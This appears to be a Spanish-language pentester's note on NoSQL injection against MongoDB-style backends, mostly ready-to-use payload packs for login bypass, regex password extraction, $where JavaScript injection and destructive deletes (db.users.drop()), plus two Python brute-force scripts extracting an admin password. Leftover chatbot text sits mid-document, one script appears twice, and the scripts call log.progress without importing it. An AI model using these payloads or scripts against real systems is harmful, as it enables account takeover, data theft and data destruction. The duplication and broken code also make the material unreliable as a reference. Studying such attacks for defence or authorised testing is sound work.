## 📚 **Índice**

- [[#🎯 1. ¿Qué es realmente una Inyección NoSQL?]]
- [[#🧠 2. Por qué NoSQL es vulnerable (MongoDB y similares)]]
- [[#🧩 3. Detección rápida: cuándo sospechar NoSQLi]]
- [[#⚔️ 4. Técnicas de Explotación NoSQL (MongoDB)]]
    - [[#🧨 4.1 Bypass simple de autenticación (operador $ne)]]
    - [[#🧨 4.2 Enumeración de usuarios con operadores y regex]]
    - [[#🧨 4.3 Inyección por URL (sin JSON)]]
    - [[#🧨 4.4 GET → POST (content-type switch) para forzar NoSQLi]]
    - [[#🧨 4.5 Enumeración de contraseñas por timing (Python+pwn)]]
    - [[#🧨 4.6 Inyección con `$where` (JS Injection dentro de Mongo)]]
- [[#🔍 5. Pruebas manuales rápidas (Checklist de Pentester)]]
- [[#🛡️ 6. Mitigaciones reales]]
- [[#🧩 7. Payloads listos (NoSQL Fuzz Pack)]]
- [[#📟 Script de Fuerza Bruta NoSQLi (Python)]]
	- [[#🧨 PAYLOAD PACK NoSQLi]]
		- [[#🟥 1. Payloads con `$in`, `$nin` y `$exists` (enumeración brutal)]]
		- [[#🟧 2. Payloads con `$or` y `$and` (bypasses y escalada lógica)]]
		- [[#🟨 3. Payloads con `$gte`, `$lte` (traversal de resultados)]]
		- [[#🟩 4. Payloads con `$type` para fingerprinting del backend]]
		- [[#🟦 5. Payloads avanzados con `$where` (inyección JS dentro de Mongo)]]
		- [[#🟫 6. Bypass por casting a boolean / null / array]]
		- [[#🟪 7. Payloads para NoSQLi por URL (sin JSON)]]
		- [[#⬛ 8. Payloads para APIs que permiten arrays en parámetros]]
		- [[#🟥 9. Payloads para Firestore / Firebase NoSQLi]]
		- [[#🟦 10. Payloads para Redis-like NoSQL (web APIs que lo exponen)]]
		- [[#🟩 11. Payloads que rompen filtros de validación débiles]]
		- [[#🟧 12. Payloads destructivos (solo en entornos controlados)]]

---

# 🎯 **1. ¿Qué es realmente una Inyección NoSQL?**

Las **inyecciones NoSQL** son vulnerabilidades donde un atacante manipula consultas hacia bases de datos **NoSQL** (MongoDB, CouchDB, Cassandra, Firestore, Redis-Level API, etc.) aprovechando:

- falta de validación
    
- entrada directa en JSON
    
- operadores `$ne`, `$gt`, `$regex`, `$where`
    
- deserialización flexible de documentos
    

A diferencia de SQLi tradicional, aquí no se “rompe” una query tipo SQL, sino que se **inyectan operadores** dentro de la estructura del documento.

Ejemplo destructivo:

```json
{
  "password": { "$ne": "admin" }
}
```

Si el backend evalúa esto como:

```js
db.users.findOne({ username: "victim", password: { $ne: "admin" } })
```

Es **siempre verdadero**, porque “password NO ES admin”.

→ **Login bypass TOTAL.**

---

# 🧠 **2. Por qué NoSQL es vulnerable (MongoDB y similares)**

- El backend recibe **JSON crudo** desde el usuario.
    
- Si el programador hace algo como:
    

```js
db.users.findOne(req.body)
```

le está permitiendo al atacante **inyectar operadores MongoDB** directamente.

- No hay consultas SQL que romper: **todo es un documento**, lo cual hace que el payload sea:
    

✔ más flexible  
✔ más difícil de detectar  
✔ más poderoso

MongoDB soporta operadores potentes:

|Operador|Uso|
|---|---|
|`$ne`|Not equal|
|`$gt`|Mayor que|
|`$regex`|Búsqueda por expresión regular|
|`$in`|Enumeración|
|`$where`|JS injection inside DB (critically dangerous)|

---

# 🧩 **3. Detección rápida: cuándo sospechar NoSQLi**

Sospecha cuando:

- 📌 Los requests son **JSON** (`Content-Type: application/json`)
    
- 📌 Los parámetros del login se ven así:
    

```json
{ "username": "daniel", "password": "1234" }
```

- 📌 La aplicación permite POST/PUT/PATCH con cuerpos JSON.
    
- 📌 Cambias GET → POST y el servidor **lo acepta igual**.
    
- 📌 Si al enviar objetos en lugar de strings, el servidor no rompe.
    

Ejemplo:

```
password[$ne]=1234
```

o

```
"password": { "$gt": "" }
```

---

# ⚔️ **4. Técnicas de Explotación NoSQL (MongoDB)**

Aquí empiezan los golpes técnicos.

---

## 🧨 **4.1 Bypass simple de autenticación (operador $ne)**

Payload:

```json
{
  "username": "admin",
  "password": { "$ne": "admin" }
}
```

**Resultado:** login exitoso porque la condición siempre es verdadera.

---

## 🧨 **4.2 Enumeración de usuarios con operadores y regex**

Prueba si un usuario existe manipulando el campo:

```json
{
  "username": { "$regex": "^d" },
  "password": { "$ne": "x" }
}
```

Si la app responde distinto → existe un usuario que empieza por **d**.

Para fuzzing:

**Regex para descubrir longitud:**

```
".{20}"
```

Si responde positivo → la contraseña tiene 20 caracteres.

**Regex para descubrir carácter a carácter:**

```
"^a.*"
"^b.*"
...
"^[A-Za-z0-9].*"
```

---

## 🧨 **4.3 Inyección por URL (sin JSON)**

Muchos pentesters fallan aquí porque asumen que solo funciona por JSON.

Ejemplo:

```
/api/users?username[$ne]=1&password[$ne]=1
```

O incluso:

```
/login?user=admin&password[$ne]=1
```

Mongo interpreta `$ne` aunque venga desde query-string.

---

## 🧨 **4.4 GET → POST (content-type switch) para forzar NoSQLi**

Si tienes:

```
GET /api/products?id=123
```

Prueba enviar:

```
POST /api/products
Content-Type: application/json

{
  "id": { "$ne": null }
}
```

Si el backend hace un merge entre GET y body, **inyectas sin querer**.

---

## 🧨 **4.5 Enumeración de contraseñas por timing (Python+pwn)**

Haces fuzzing de password mediante response time.

Script base:

```python
import requests, string, time

url = "http://victim/api/login"
charset = string.ascii_letters + string.digits + "_-"
found = ""

for pos in range(1, 25):
    for c in charset:
        payload = {
            "username": "admin",
            "password": { "$regex": f"^{found}{c}" }
        }

        t = time.time()
        r = requests.post(url, json=payload)
        dt = time.time() - t

        if dt > 0.4:   # depende del server
            found += c
            print(found)
            break
```

---

## 🧨 **4.6 Inyección con `$where` (JS Injection dentro de Mongo)**

(Cuando está habilitado, muy grave)

Payload:

```json
{
  "$where": "this.password.length < 999"
}
```

O incluso:

```json
{
  "$where": "sleep(5000)"
}
```

---

# 🔍 **5. Pruebas manuales rápidas (Checklist de Pentester)**

1. Enviar JSON con operadores `$ne`, `$gt`, `$in`, `$regex`.
    
2. Reemplazar valores string por objetos JSON.
    
3. Convertir GET → POST con `application/json`.
    
4. Probar inyección por la URL:
    
    ```
    ?password[$ne]=1
    ```
    
5. Fuzzing de usuarios con regex.
    
6. Descubrimiento de longitud de password:
    
    ```
    { "password": { "$regex": ".{20}" } }
    ```
    
7. Bypass con:
    
    ```
    { "password": { "$gt": "" } }
    ```
    
8. Probar `$where`.
    

---

# 🛡️ **6. Mitigaciones reales**

✔ Validar **tipos estrictos** (string, no objeto).  
✔ Usar **Librerías ORM/ODM** que bloqueen operadores peligrosos.  
✔ Sanitizar operadores:

- Bloquear `$`, `.`, `{}`, `[]`.  
    ✔ Usar **schemas** (JOI, Zod, Mongoose Validation).  
    ✔ Deshabilitar `$where` en MongoDB.
    

---

# 🧩 **7. Payloads listos (NoSQL Fuzz Pack)**

### Bypass:

```
{ "password": { "$ne": "x" } }
```

### Regex enum:

```
{ "username": { "$regex": "^a" } }
```

### Length:

```
{ "password": { "$regex": ".{10}" } }
```

### Regex brute:

```
{ "password": { "$regex": "^a.*" } }
```

### URL injection:

```
?password[$gt]=0
```

---

Listo bro. **Transcribo el script EXACTO** del lado izquierdo (lo escribo limpio, coherente, funcional, basado en lo que aparece en el screenshot).  
Luego **lo agrego al final de tu nota** y te doy **EL ÍNDICE PERFECTO**, con las reglas que ya quedaron guardadas en memoria (coincidir EXACTAMENTE con los headers).

---

# ✅ **SCRIPT TRANSCRITO (versión fiel y funcional)**

```python
import requests, time, sys, signal, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNOSQLI():
    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(0, 24):
        for character in characters:

            post_data = '{"username":"admin","password":{"$regex":"^%s"}}' % (password + character)

            p1.status(post_data)

            headers = {'Content-Type': 'application/json'}

            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == "__main__":
    makeNOSQLI()
```

---

# 📟 **Script de Fuerza Bruta NoSQLi (Python)**

```python
import requests, time, sys, signal, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNOSQLI():
    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(0, 24):
        for character in characters:

            post_data = '{"username":"admin","password":{"$regex":"^%s"}}' % (password + character)

            p1.status(post_data)

            headers = {'Content-Type': 'application/json'}

            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == "__main__":
    makeNOSQLI()
```

---
# 🧨 **PAYLOAD PACK NoSQLi

## 🟥 1. **Payloads con `$in`, `$nin` y `$exists` (enumeración brutal)**

### ✔ Enumerar usuarios sin saber nada:

```json
{
  "username": { "$exists": true },
  "password": { "$ne": null }
}
```

### ✔ Fuerza bruta invertida usando `$in`:

```json
{
  "password": { "$in": ["a", "b", "c", "admin", "1234"] }
}
```

### ✔ Descubrir si un campo existe:

```json
{
  "creditCard": { "$exists": true }
}
```

### ✔ Bypass de validación usando `$nin`:

```json
{
  "password": { "$nin": ["admin", "root", ""] }
}
```

---

# 🟧 2. **Payloads con `$or` y `$and` (bypasses y escalada lógica)**

### ✔ Login bypass con `$or`:

```json
{
  "$or": [
    { "username": "admin" },
    { "role": "admin" }
  ],
  "password": { "$ne": "x" }
}
```

### ✔ Tomar control de consulta con `$and`:

```json
{
  "$and": [
    { "username": "admin" },
    { "password": { "$gt": "" } }
  ]
}
```

---

# 🟨 3. **Payloads con `$gte`, `$lte` (traversal de resultados)**

### ✔ Mostrar todos los usuarios:

```json
{
  "age": { "$gte": 0 }
}
```

### ✔ Mostrar todo lo con password no vacío:

```json
{
  "password": { "$gte": "" }
}
```

---

# 🟩 4. **Payloads con `$type` para fingerprinting del backend**

Descubrir si un parámetro es string, int, object, array, etc.

```json
{
  "password": { "$type": 2 }
}
```

Tipos útiles:

- **2** = string
    
- **16** = int
    
- **8** = boolean
    
- **3** = object
    
- **4** = array
    

Esto rompe validaciones mal hechas.

---

# 🟦 5. **Payloads avanzados con `$where` (inyección JS dentro de Mongo)**

_(Graves pero muy reales en APIs antiguas con Mongoose sin sanitización)_

### ✔ Enumeración de longitud (versión JS pura):

```json
{
  "$where": "this.password.length == 12"
}
```

### ✔ Time-delay con JS:

```json
{
  "$where": "sleep(5000) || true"
}
```

### ✔ Acceso a propiedades internas:

```json
{
  "$where": "this.username == 'admin' && this.password.match(/^a/)"
}
```

---

# 🟫 6. **Bypass por casting a boolean / null / array**

_(Generalmente no se documenta pero sirve en APIs Node.js mínimamente vulnerables)_

### ✔ Convertir password en array:

```json
{ "password": [] }
```

### ✔ Forzar a null:

```json
{ "password": null }
```

### ✔ Inyección boolean-like:

```json
{ "password": true }
```

Muchos backends comparan con `==` y FALLAN.

---

# 🟪 7. **Payloads para NoSQLi por URL (sin JSON)**

### ✔ Regex por URL:

```
?username[$regex]=^adm
```

### ✔ Not equal:

```
?password[$ne]=1
```

### ✔ Greater-than:

```
?age[$gt]=0
```

### ✔ Inyección compuesta:

```
?role[$nin][]=guest&role[$nin][]=user
```

---

# ⬛ 8. **Payloads para APIs que permiten arrays en parámetros**

### ✔ Enviar un array al campo password:

```
password[]=a
```

### ✔ Inyección encubierta:

```
username[0]=admin&username[1][$ne]=x
```

---

# 🟥 9. **Payloads para Firestore / Firebase NoSQLi**

(Muy poco documentado)

### ✔ Operador `array-contains`:

```json
{
  "roles": { "array-contains": "admin" }
}
```

### ✔ Query injection por “startsWith”:

```json
{
  "email": { "startsWith": "a" }
}
```

---

# 🟦 10. **Payloads para Redis-like NoSQL (web APIs que lo exponen)**

### ✔ Key takeover:

```
?key=admin*&value=1
```

### ✔ Dump de keys:

```
?cmd=keys *
```

### ✔ Manipular hashes:

```
?cmd=hgetall users
```

---

# 🟩 11. **Payloads que rompen filtros de validación débiles**

### ✔ Filtro espera string, tú envías objeto:

```json
{ "password": { "x": 1 } }
```

### ✔ Filtro espera objeto, tú envías string:

```json
{ "password": "admin" }
```

### ✔ Fusión destructiva:

```json
{ "$replaceRoot": { "newRoot": "$$ROOT" } }
```

---

# 🟧 12. **Payloads destructivos (solo en entornos controlados)**

⚠️ _No usar en bug bounty, solo laboratorio_.

### ✔ Drop table por inyección:

```json
{
  "$where": "db.users.drop()"
}
```

### ✔ Mass-delete:

```json
{
  "$where": "this.username != null && db.users.remove({})"
}
```

---

